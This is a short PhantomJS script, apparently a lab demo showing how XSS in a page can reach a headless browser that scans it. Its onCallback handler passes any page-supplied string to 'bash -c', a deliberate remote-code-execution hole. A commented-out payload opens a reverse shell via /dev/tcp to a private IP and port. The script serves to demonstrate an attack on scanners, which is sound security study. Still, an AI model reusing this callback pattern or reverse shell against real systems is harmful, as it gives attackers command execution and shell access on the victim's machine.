
var page = require('webpage').create();
var process = require("child_process");
var spawn = process.spawn;
var execFile = process.execFile;

page.onConsoleMessage = function(msg) {
    console.log(msg);
};

// page.open("http://webscantest.com/rest/demo/blind.php", function(status) {
page.open("http://localhost/appspider-vuln-site/rest/demo/blind.php", function(status) {
    if ( status === "success" ) {
        //this is the demo payload...
        // page.evaluate(function() {
        //     console.log('headless browser XSS demo. (phantom hunter)');
        //     if (typeof window.callPhantom === 'function') {
        //       window.callPhantom("0<&192-;exec 192<>/dev/tcp/192.168.0.34/6680;sh <&192 >&192 2>&192");
      		// 	}
        // });
    }
});

page.onCallback = function(data) {
  	spawn("bash",["-c",data],{ stdio: 'inherit' });
};

